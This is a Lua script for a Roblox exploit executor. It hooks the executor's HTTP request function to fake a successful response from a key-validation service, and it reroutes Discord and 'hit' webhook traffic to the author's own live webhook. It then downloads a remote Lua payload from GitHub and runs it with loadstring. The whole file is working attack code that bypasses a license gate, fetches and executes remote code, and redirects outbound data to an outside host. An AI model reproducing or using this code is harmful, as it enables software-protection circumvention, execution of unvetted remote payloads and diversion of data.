-- ==========================================
-- 1. ENVIRONMENT MOCKING & HOOKING
-- ==========================================
getgenv().USERNAME = "BLACKGOKU_0707"
getgenv().bfRunning = true

local targetWebhook = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY"

-- Mock file functions so cached keys write successfully
if writefile and readfile and isfile then
    pcall(function()
        writefile("fe4r_key_cache.txt", "BLACKGOKU_0707_BYPASSED")
    end)
end

-- Intercept outgoing network requests
local originalRequest = syn and syn.request or http_request or request
if originalRequest then
    hookfunction(originalRequest, function(requestData)
        if type(requestData) == "table" and requestData.Url then
            -- Redirect webhook hits
            if requestData.Url:match("discord.com/api/webhooks") or requestData.Url:match("vault.fe4r.click/api/v2/hit") then
                requestData.Url = targetWebhook
            
            -- Mock key validation with complete schema fields
            elseif requestData.Url:match("vault.fe4r.click/api/v2/key/validate") then
                print("[+] Intercepted key validation request. Spoofing success response.")
                return {
                    StatusCode = 200,
                    Body = '{"valid": true, "message": "Key valid", "token": "mock_session_token_123"}',
                    Headers = {["Content-Type"] = "application/json"}
                }
            end
        end
        return originalRequest(requestData)
    end)
end

-- ==========================================
-- 2. LOAD CORE PAYLOAD
-- ==========================================
local success, scriptContent = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/eb0ab3dfebda3957.lua.txt")
end)

if success and scriptContent then
    local fn, err = loadstring(scriptContent)
    if fn then
        print("[+] Payload loaded with key gate bypassed!")
        fn()
    else
        -- Fixed concatenation operator from '+' to '..'
        warn("[-] Compile error: " .. tostring(err))
    end
else
    warn("[-] Failed to download remote payload source.")
end
